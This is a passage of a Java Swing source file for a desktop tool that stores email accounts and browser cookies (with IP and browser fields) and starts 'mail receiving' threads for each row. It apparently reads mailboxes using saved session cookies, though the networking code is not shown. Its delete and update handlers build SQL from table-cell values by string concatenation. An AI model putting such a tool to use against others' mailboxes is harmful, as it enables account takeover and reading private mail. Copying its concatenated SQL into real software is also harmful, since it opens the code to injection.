/*
 * EmailView.java
 */

package email;


import java.awt.Toolkit;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jdesktop.application.Action;
import org.jdesktop.application.ResourceMap;
import org.jdesktop.application.SingleFrameApplication;
import org.jdesktop.application.FrameView;
import org.jdesktop.application.TaskMonitor;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.DateFormat;
import java.util.Date;
import javax.swing.Timer;
import javax.swing.Icon;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellEditor;
import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.URI;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import sun.misc.BASE64Decoder;

/**
 * The application's main frame.
 */
public class EmailView extends FrameView implements MailFuncInter {

    public EmailView(SingleFrameApplication app) {
        super(app);

        initComponents();
        initControl();
        // status bar initialization - message timeout, idle icon and busy animation, etc
        ResourceMap resourceMap = getResourceMap();
        int messageTimeout = resourceMap.getInteger("StatusBar.messageTimeout");
        messageTimer = new Timer(messageTimeout, new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                statusMessageTime.setText("");
            }
        });
        messageTimer.setRepeats(false);
        int busyAnimationRate = resourceMap.getInteger("StatusBar.busyAnimationRate");
        for (int i = 0; i < busyIcons.length; i++) {
            busyIcons[i] = resourceMap.getIcon("StatusBar.busyIcons[" + i + "]");
        }
        busyIconTimer = new Timer(busyAnimationRate, new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                busyIconIndex = (busyIconIndex + 1) % busyIcons.length;
                statusAnimationuseTime.setIcon(busyIcons[busyIconIndex]);
            }
        });
        idleIcon = resourceMap.getIcon("StatusBar.idleIcon");
        statusAnimationuseTime.setIcon(idleIcon);
        myprogressBar.setVisible(false);

        // connecting action tasks to status bar via TaskMonitor
        TaskMonitor taskMonitor = new TaskMonitor(getApplication().getContext());
        taskMonitor.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
            public void propertyChange(java.beans.PropertyChangeEvent evt) {
                String propertyName = evt.getPropertyName();
                if ("started".equals(propertyName)) {
                    if (!busyIconTimer.isRunning()) {
                        statusAnimationuseTime.setIcon(busyIcons[0]);
                        busyIconIndex = 0;
                        busyIconTimer.start();
                    }
                    myprogressBar.setVisible(true);
                    myprogressBar.setIndeterminate(true);
                } else if ("done".equals(propertyName)) {
                    busyIconTimer.stop();
                    statusAnimationuseTime.setIcon(idleIcon);
                    myprogressBar.setVisible(false);
                    myprogressBar.setValue(0);
                } else if ("message".equals(propertyName)) {
                    String text = (String)(evt.getNewValue());
                    statusMessageTime.setText((text == null) ? "" : text);
                    messageTimer.restart();
                } else if ("progress".equals(propertyName)) {
                    int value = (Integer)(evt.getNewValue());
                    myprogressBar.setVisible(true);
                    myprogressBar.setIndeterminate(false);
                    myprogressBar.setValue(value);
                }
            }
        });
    }



    @Action
    public void showAboutBox() {
        if (aboutBox == null) {
            JFrame mainFrame = EmailApp.getApplication().getMainFrame();
            aboutBox = new EmailAboutBox(mainFrame);
            aboutBox.setLocationRelativeTo(mainFrame);
        }
        EmailApp.getApplication().show(aboutBox);
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        mainPanel = new javax.swing.JPanel();
        jToolBar1 = new javax.swing.JToolBar();
        jLabel2 = new javax.swing.JLabel();
        jButton_recv = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        jButtonstop = new javax.swing.JButton();
        jLabel4 = new javax.swing.JLabel();
        jButtonRecvall = new javax.swing.JButton();
        jLabel5 = new javax.swing.JLabel();
        jButtonStopall = new javax.swing.JButton();
        jLabel6 = new javax.swing.JLabel();
        jButtonEdit = new javax.swing.JButton();
        jLabel7 = new javax.swing.JLabel();
        jButtonDel = new javax.swing.JButton();
        jTabbedPaneKind = new javax.swing.JTabbedPane();
        jPanel1 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTable_user = new javax.swing.JTable();
        jPanel2 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        jTable_cookie = new javax.swing.JTable();
        jPanel3 = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextInfo = new javax.swing.JTextArea();
        menuBar = new javax.swing.JMenuBar();
        javax.swing.JMenu fileMenu = new javax.swing.JMenu();
        javax.swing.JMenuItem exitMenuItem = new javax.swing.JMenuItem();
        jMenu1 = new javax.swing.JMenu();
        jMenuItemAdduser = new javax.swing.JMenuItem();
        jMenuItemAddcookie = new javax.swing.JMenuItem();
        jMenuItemRefash = new javax.swing.JMenuItem();
        jMenuSetting = new javax.swing.JMenu();
        jMenuItemConfig = new javax.swing.JMenuItem();
        jMenuItemDatabase = new javax.swing.JMenuItem();
        javax.swing.JMenu helpMenu = new javax.swing.JMenu();
        javax.swing.JMenuItem aboutMenuItem = new javax.swing.JMenuItem();
        statusPanel = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        statusMessageTime = new javax.swing.JLabel();
        statusAnimationuseTime = new javax.swing.JLabel();
        myprogressBar = new javax.swing.JProgressBar();

        mainPanel.setName("mainPanel"); // NOI18N

        jToolBar1.setRollover(true);
        jToolBar1.setName("jToolBar1"); // NOI18N

        org.jdesktop.application.ResourceMap resourceMap = org.jdesktop.application.Application.getInstance(email.EmailApp.class).getContext().getResourceMap(EmailView.class);
        jLabel2.setIcon(resourceMap.getIcon("jLabel2.icon")); // NOI18N
        jLabel2.setText(resourceMap.getString("jLabel2.text")); // NOI18N
        jLabel2.setName("jLabel2"); // NOI18N
        jToolBar1.add(jLabel2);

        jButton_recv.setText(resourceMap.getString("jButton_recv.text")); // NOI18N
        jButton_recv.setFocusable(false);
        jButton_recv.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButton_recv.setName("jButton_recv"); // NOI18N
        jButton_recv.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton_recv.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButton_recvMouseClicked(evt);
            }
        });
        jToolBar1.add(jButton_recv);

        jLabel3.setIcon(resourceMap.getIcon("jLabel3.icon")); // NOI18N
        jLabel3.setText(resourceMap.getString("jLabel3.text")); // NOI18N
        jLabel3.setName("jLabel3"); // NOI18N
        jToolBar1.add(jLabel3);

        jButtonstop.setText(resourceMap.getString("jButtonstop.text")); // NOI18N
        jButtonstop.setFocusable(false);
        jButtonstop.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButtonstop.setName("jButtonstop"); // NOI18N
        jButtonstop.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButtonstop.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButtonstopMouseClicked(evt);
            }
        });
        jToolBar1.add(jButtonstop);

        jLabel4.setIcon(resourceMap.getIcon("jLabel4.icon")); // NOI18N
        jLabel4.setText(resourceMap.getString("jLabel4.text")); // NOI18N
        jLabel4.setName("jLabel4"); // NOI18N
        jToolBar1.add(jLabel4);

        jButtonRecvall.setText(resourceMap.getString("jButtonRecvall.text")); // NOI18N
        jButtonRecvall.setFocusable(false);
        jButtonRecvall.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButtonRecvall.setName("jButtonRecvall"); // NOI18N
        jButtonRecvall.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButtonRecvall.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButtonRecvallMouseClicked(evt);
            }
        });
        jToolBar1.add(jButtonRecvall);

        jLabel5.setIcon(resourceMap.getIcon("jLabel5.icon")); // NOI18N
        jLabel5.setText(resourceMap.getString("jLabel5.text")); // NOI18N
        jLabel5.setName("jLabel5"); // NOI18N
        jToolBar1.add(jLabel5);

        jButtonStopall.setText(resourceMap.getString("jButtonStopall.text")); // NOI18N
        jButtonStopall.setFocusable(false);
        jButtonStopall.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButtonStopall.setName("jButtonStopall"); // NOI18N
        jButtonStopall.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButtonStopall.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButtonStopallMouseClicked(evt);
            }
        });
        jToolBar1.add(jButtonStopall);

        jLabel6.setIcon(resourceMap.getIcon("jLabel6.icon")); // NOI18N
        jLabel6.setText(resourceMap.getString("jLabel6.text")); // NOI18N
        jLabel6.setName("jLabel6"); // NOI18N
        jToolBar1.add(jLabel6);

        jButtonEdit.setText(resourceMap.getString("jButtonEdit.text")); // NOI18N
        jButtonEdit.setFocusable(false);
        jButtonEdit.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButtonEdit.setName("jButtonEdit"); // NOI18N
        jButtonEdit.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButtonEdit.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButtonEditMouseClicked(evt);
            }
        });
        jToolBar1.add(jButtonEdit);

        jLabel7.setIcon(resourceMap.getIcon("jLabel7.icon")); // NOI18N
        jLabel7.setText(resourceMap.getString("jLabel7.text")); // NOI18N
        jLabel7.setName("jLabel7"); // NOI18N
        jToolBar1.add(jLabel7);

        jButtonDel.setText(resourceMap.getString("jButtonDel.text")); // NOI18N
        jButtonDel.setFocusable(false);
        jButtonDel.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        jButtonDel.setName("jButtonDel"); // NOI18N
        jButtonDel.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButtonDel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButtonDelMouseClicked(evt);
            }
        });
        jToolBar1.add(jButtonDel);

        jTabbedPaneKind.setName("jTabbedPaneKind"); // NOI18N
        jTabbedPaneKind.addChangeListener(new javax.swing.event.ChangeListener() {
            public void stateChanged(javax.swing.event.ChangeEvent evt) {
                jTabbedPaneKindStateChanged(evt);
            }
        });

        jPanel1.setName("jPanel1"); // NOI18N
        jPanel1.setPreferredSize(new java.awt.Dimension(809, 385));

        jScrollPane1.setName("jScrollPane1"); // NOI18N

        jTable_user.setModel(this.initTable_User());
        jTable_user.setName("jTable_user"); // NOI18N
        jTable_user.getTableHeader().setReorderingAllowed(false);
        jScrollPane1.setViewportView(jTable_user);

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 852, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 247, Short.MAX_VALUE)
        );

        jTabbedPaneKind.addTab(resourceMap.getString("jPanel1.TabConstraints.tabTitle"), jPanel1); // NOI18N

        jPanel2.setName("jPanel2"); // NOI18N

        jScrollPane3.setName("jScrollPane3"); // NOI18N

        jTable_cookie.setModel(this.initTable_Cookie());
        jTable_cookie.setName("jTable_cookie"); // NOI18N
        jScrollPane3.setViewportView(jTable_cookie);

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 852, Short.MAX_VALUE)
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 247, Short.MAX_VALUE)
        );

        jTabbedPaneKind.addTab(resourceMap.getString("jPanel2.TabConstraints.tabTitle"), jPanel2); // NOI18N

        jPanel3.setName("jPanel3"); // NOI18N

        jScrollPane2.setName("jScrollPane2"); // NOI18N

        jTextInfo.setColumns(20);
        jTextInfo.setRows(5);
        jTextInfo.setName("jTextInfo"); // NOI18N
        jScrollPane2.setViewportView(jTextInfo);

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 857, Short.MAX_VALUE)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 99, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(mainPanel);
        mainPanel.setLayout(mainPanelLayout);
        mainPanelLayout.setHorizontalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPaneKind, javax.swing.GroupLayout.DEFAULT_SIZE, 857, Short.MAX_VALUE)
            .addGroup(mainPanelLayout.createSequentialGroup()
                .addComponent(jToolBar1, javax.swing.GroupLayout.PREFERRED_SIZE, 847, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
            .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        mainPanelLayout.setVerticalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainPanelLayout.createSequentialGroup()
                .addComponent(jToolBar1, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTabbedPaneKind, javax.swing.GroupLayout.PREFERRED_SIZE, 276, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(4, 4, 4)
                .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        menuBar.setName("menuBar"); // NOI18N

        fileMenu.setIcon(resourceMap.getIcon("fileMenu.icon")); // NOI18N
        fileMenu.setText(resourceMap.getString("fileMenu.text")); // NOI18N
        fileMenu.setName("fileMenu"); // NOI18N

        javax.swing.ActionMap actionMap = org.jdesktop.application.Application.getInstance(email.EmailApp.class).getContext().getActionMap(EmailView.class, this);
        exitMenuItem.setAction(actionMap.get("quit")); // NOI18N
        exitMenuItem.setName("exitMenuItem"); // NOI18N
        fileMenu.add(exitMenuItem);

        menuBar.add(fileMenu);

        jMenu1.setIcon(resourceMap.getIcon("jMenu1.icon")); // NOI18N
        jMenu1.setText(resourceMap.getString("jMenu1.text")); // NOI18N
        jMenu1.setName("jMenu1"); // NOI18N

        jMenuItemAdduser.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_U, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItemAdduser.setText(resourceMap.getString("jMenuItemAdduser.text")); // NOI18N
        jMenuItemAdduser.setName("jMenuItemAdduser"); // NOI18N
        jMenuItemAdduser.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jMenuItemAdduserMousePressed(evt);
            }
        });
        jMenu1.add(jMenuItemAdduser);

        jMenuItemAddcookie.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_K, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItemAddcookie.setText(resourceMap.getString("jMenuItemAddcookie.text")); // NOI18N
        jMenuItemAddcookie.setName("jMenuItemAddcookie"); // NOI18N
        jMenuItemAddcookie.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jMenuItemAddcookieMousePressed(evt);
            }
        });
        jMenu1.add(jMenuItemAddcookie);

        jMenuItemRefash.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItemRefash.setText(resourceMap.getString("jMenuItemRefash.text")); // NOI18N
        jMenuItemRefash.setName("jMenuItemRefash"); // NOI18N
        jMenuItemRefash.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jMenuItemRefashMousePressed(evt);
            }
        });
        jMenu1.add(jMenuItemRefash);

        menuBar.add(jMenu1);

        jMenuSetting.setIcon(resourceMap.getIcon("jMenuSetting.icon")); // NOI18N
        jMenuSetting.setText(resourceMap.getString("jMenuSetting.text")); // NOI18N
        jMenuSetting.setName("jMenuSetting"); // NOI18N

        jMenuItemConfig.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItemConfig.setText(resourceMap.getString("jMenuItemConfig.text")); // NOI18N
        jMenuItemConfig.setName("jMenuItemConfig"); // NOI18N
        jMenuItemConfig.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jMenuItemConfigMousePressed(evt);
            }
        });
        jMenuSetting.add(jMenuItemConfig);

        jMenuItemDatabase.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_D, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItemDatabase.setText(resourceMap.getString("jMenuItemDatabase.text")); // NOI18N
        jMenuItemDatabase.setName("jMenuItemDatabase"); // NOI18N
        jMenuItemDatabase.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                jMenuItemDatabaseMousePressed(evt);
            }
        });
        jMenuSetting.add(jMenuItemDatabase);

        menuBar.add(jMenuSetting);

        helpMenu.setIcon(resourceMap.getIcon("helpMenu.icon")); // NOI18N
        helpMenu.setText(resourceMap.getString("helpMenu.text")); // NOI18N
        helpMenu.setName("helpMenu"); // NOI18N

        aboutMenuItem.setAction(actionMap.get("showAboutBox")); // NOI18N
        aboutMenuItem.setName("aboutMenuItem"); // NOI18N
        helpMenu.add(aboutMenuItem);

        menuBar.add(helpMenu);

        statusPanel.setName("statusPanel"); // NOI18N
        statusPanel.setLayout(new java.awt.GridLayout(1, 0));

        jLabel1.setText(resourceMap.getString("jLabel1.text")); // NOI18N
        jLabel1.setName("jLabel1"); // NOI18N
        statusPanel.add(jLabel1);

        statusMessageTime.setText(resourceMap.getString("statusMessageTime.text")); // NOI18N
        statusMessageTime.setName("statusMessageTime"); // NOI18N
        statusPanel.add(statusMessageTime);

        statusAnimationuseTime.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        statusAnimationuseTime.setText(resourceMap.getString("statusAnimationuseTime.text")); // NOI18N
        statusAnimationuseTime.setName("statusAnimationuseTime"); // NOI18N
        statusPanel.add(statusAnimationuseTime);
        statusPanel.add(myprogressBar);

        setComponent(mainPanel);
        setMenuBar(menuBar);
        setStatusBar(statusPanel);
    }// </editor-fold>//GEN-END:initComponents

    private void jButton_recvMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButton_recvMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        if(selectTab==0)
        {
            this.SetRecvType(true);
             this.SetuserAllThreadMark(true);
            this.SetThreadmark(true);
            int selectRows=jTable_user.getSelectedRow();                            //判断用户是否选中行
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                Object arg_id=tableModel.getValueAt(selectRows, 0);              // 取得第i行第一列的数据
                                   
                ThreadPool.BeginRecThread(arg_id,recvType);                              //密码收邮线程
                this.initTable_User();
            }
        }
        else
        {
            this.SetRecvType(false);
            this.SetcookieAllThreadMark(true);
            this.SetThreadmark(true);
            int selectRows=jTable_cookie.getSelectedRow();                            //判断用户是否选中行
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                Object arg_id=tableModel.getValueAt(selectRows, 0);           // 取得第i行第一列的数据
                ThreadPool.BeginRecThread(arg_id,recvType);                      //cookie收邮线程
                this.initTable_Cookie();
            }
        }

    }//GEN-LAST:event_jButton_recvMouseClicked

    private void jMenuItemAdduserMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenuItemAdduserMousePressed
        // TODO add your handling code here:
        AddUserFrame addFrame=new AddUserFrame(this);
        addFrame.show();
        addFrame.setLocation((Toolkit.getDefaultToolkit().getScreenSize().width-addFrame.getWidth())/2,
						 (Toolkit.getDefaultToolkit().getScreenSize().height-addFrame.getHeight())/2);
        
    }//GEN-LAST:event_jMenuItemAdduserMousePressed

    private void jMenuItemAddcookieMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenuItemAddcookieMousePressed
        // TODO add your handling code here:
        AddCookieFrame addcookieFrame=new AddCookieFrame(this);
        addcookieFrame.show();
        //设置对话框在窗口中的位置
        addcookieFrame.setLocation((Toolkit.getDefaultToolkit().getScreenSize().width-addcookieFrame.getWidth())/2,
						 (Toolkit.getDefaultToolkit().getScreenSize().height-addcookieFrame.getHeight())/2);
    }//GEN-LAST:event_jMenuItemAddcookieMousePressed
    /**
     * 删除选中列函数
     * @param evt
     */
    private void jButtonDelMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButtonDelMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        if(selectTab==0)
        {
            int selectRows=jTable_user.getSelectedRow();
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                Object m_id=tableModel.getValueAt(selectRows, 0);           // 取得第i行第一列的数据
                String sql="delete from emailaccounts where ID='"+m_id+"'";
                if(this.Excutemdl(sql)==1)
                {
                    JOptionPane.showMessageDialog(null, "delete done!");
                    this.RefashCookie();                                        //操作后对talbe进行刷新
                    this.RefashTable();
                }
                else
                {
                    JOptionPane.showMessageDialog(null, "delete error!");
                }

            }
        }
        else
        {
            int selectRows=jTable_cookie.getSelectedRow();
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                Object id=tableModel.getValueAt(selectRows, 0);           // 取得第i行第一列的数据
                String sql="delete from emailcookies where ID='"+id+"'";
                if(this.Excutemdl(sql)==1)
                {
                    JOptionPane.showMessageDialog(null, "delete done!");
                    this.RefashCookie();
                    this.RefashTable();
                }
                else
                {
                    JOptionPane.showMessageDialog(null, "delete error!");
                }

            }
        }
    }//GEN-LAST:event_jButtonDelMouseClicked

    private void jMenuItemRefashMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenuItemRefashMousePressed
        // TODO add your handling code here:
        this.RefashTable();
        this.RefashCookie();
        
    }//GEN-LAST:event_jMenuItemRefashMousePressed

    private void jTabbedPaneKindStateChanged(javax.swing.event.ChangeEvent evt) {//GEN-FIRST:event_jTabbedPaneKindStateChanged
        // TODO add your handling code here:
}//GEN-LAST:event_jTabbedPaneKindStateChanged

    private void jButtonstopMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButtonstopMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        
        if(selectTab==0)
        {
            this.SetRecvType(true);
            int selectRows=jTable_user.getSelectedRow();                            //判断用户是否选中行
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                Object arg_id=tableModel.getValueAt(selectRows, 0);              // 取得第i行第一列的数据

                ThreadPool.AbortThread(arg_id,recvType);                              //密码收邮线程
                this.RefashTable();
            }
        }
        else
        {
            this.SetRecvType(true);
            int selectRows=jTable_cookie.getSelectedRow();                            //判断用户是否选中行
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
            // jTextInfo.setText("you choose one!\n");
                DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                Object arg_id=tableModel.getValueAt(selectRows, 0);           // 取得第i行第一列的数据
                ThreadPool.AbortThread(arg_id,recvType);                      //cookie收邮线程
                this.RefashCookie();

            }
        }
    }//GEN-LAST:event_jButtonstopMouseClicked

    private void jButtonEditMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButtonEditMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        if(selectTab==0)
        {
            int selectRows=jTable_user.getSelectedRow();
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                if(jTable_user.isEditing())
                {
                    int row = jTable_user.getEditingColumn();//那一行
                    int col = jTable_user.getEditingColumn(); //那一列
                    TableCellEditor editor = jTable_user.getCellEditor(row, col);
                    editor.stopCellEditing();
                }
                String account=(String) jTable_user.getValueAt(selectRows, 1);
                String usermsg=(String) jTable_user.getValueAt(selectRows, 2);
                String power=(String) jTable_user.getValueAt(selectRows, 3);
                String mailtype=(String) jTable_user.getValueAt(selectRows, 5);

                DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                Object arg_id = tableModel.getValueAt(selectRows, 0); // 取得第i行第一列的数据

                String updatesql="update  emailaccounts set accounts='"+account+"'"+","+"userMessage='"+usermsg+"'"
                        +","+"Power='"+power+"'"+","+"MailType='"+mailtype+"' where ID='"+arg_id+"'";
                if(1==this.Excutemdl(updatesql))
                {
                    JOptionPane.showMessageDialog( null, "修改成功！","提示",JOptionPane.INFORMATION_MESSAGE);
                }
                else
                {
                    JOptionPane.showMessageDialog( null, "请不要编辑ID、LastTime、mailNumber、RevState在次尝试！","提示",JOptionPane.ERROR_MESSAGE);
                    this.RefashTable();
                }
                
               
            }
        }
        else
        {
            int selectRows=jTable_cookie.getSelectedRow();
            if(-1==selectRows)
            {
                JOptionPane.showMessageDialog( null, "please choose one line！","提示",JOptionPane.ERROR_MESSAGE);

            }
            else
            {
                if(jTable_cookie.isEditing())
                {
                    int row = jTable_cookie.getEditingColumn();//那一行
                    int col = jTable_cookie.getEditingColumn(); //那一列
                    TableCellEditor editor = jTable_cookie.getCellEditor(row, col);
                    editor.stopCellEditing();
                }
                String user=(String) jTable_cookie.getValueAt(selectRows, 1);
                String cookie=(String) jTable_cookie.getValueAt(selectRows, 2);
                String IP=(String) jTable_cookie.getValueAt(selectRows, 3);
                String logo=(String) jTable_cookie.getValueAt(selectRows, 5);
                String browser=(String) jTable_cookie.getValueAt(selectRows, 6);
                String mailtype=(String) jTable_cookie.getValueAt(selectRows, 8);

                DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                Object arg_id = tableModel.getValueAt(selectRows, 0); // 取得第i行第一列的数据

                String updatesql="update  emailcookies set user='"+user+"'"+","+"cookie='"+cookie+"'"
                        +","+"IP='"+IP+"'"+","+"logo='"+logo+"'"+","+"MailType='"+mailtype+"' where ID='"+arg_id+"'";
                if(1==this.Excutemdl(updatesql))
                {
                    JOptionPane.showMessageDialog( null, "修改成功！","提示",JOptionPane.INFORMATION_MESSAGE);
                }
                else
                {
